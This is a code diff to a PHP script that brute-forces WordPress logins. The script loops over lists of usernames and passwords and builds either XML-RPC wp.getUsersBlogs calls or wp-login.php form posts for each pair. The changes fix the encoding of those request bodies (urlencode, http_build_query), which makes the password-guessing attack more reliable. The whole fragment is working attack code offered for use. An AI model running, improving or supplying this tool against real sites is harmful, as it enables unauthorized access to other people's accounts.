@@ -137,9 +137,10 @@ if(is_array($username)){
     foreach($username as $user){
         foreach($passwords as $pwd){
             if($option == 1){
-                $postfield[] = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.$user.'</value></param><param><value>'.$pwd.'</value></param></params></methodCall>';
+                $postfield[] = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.urlencode($user).'</value></param><param><value>'.urlencode($pwd).'</value></param></params></methodCall>';
             }else{
-                $postfield[] = 'log='.$user.'&pwd='.$pwd.'&wp-submit=Log+In&redirect_to='.$host_http.'/wp-admin/&testcookie=1';
+                // $postfield[] = 'log='.$user.'&pwd='.$pwd.'&wp-submit=Log+In&redirect_to='.$host_http.'/wp-admin/&testcookie=1';
+                $postfield[] = http_build_query(['log' => $user,'pwd' => $pwd,'wp-submit' => 'Log In','redirect_to' => $host_http.'/wp-admin/','testcookie' => 1]);
             }
         }
     }
@@ -147,9 +148,10 @@ if(is_array($username)){
 }else{
     foreach($passwords as $pwd){
         if($option == 1){
-            $postfield[] = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.$username.'</value></param><param><value>'.$pwd.'</value></param></params></methodCall>';
+            $postfield[] = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'.urlencode($username).'</value></param><param><value>'.urlencode($pwd).'</value></param></params></methodCall>';
         }else{
-            $postfield[] = 'log='.$username.'&pwd='.$pwd.'&wp-submit=Log+In&redirect_to='.$host_http.'/wp-admin/&testcookie=1';
+            // $postfield[] = 'log='.$username.'&pwd='.$pwd.'&wp-submit=Log+In&redirect_to='.$host_http.'/wp-admin/&testcookie=1';
+            $postfield[] = http_build_query(['log' => $username,'pwd' => $pwd,'wp-submit' => 'Log In','redirect_to' => $host_http.'/wp-admin/','testcookie' => 1]);
         }
     }
 }
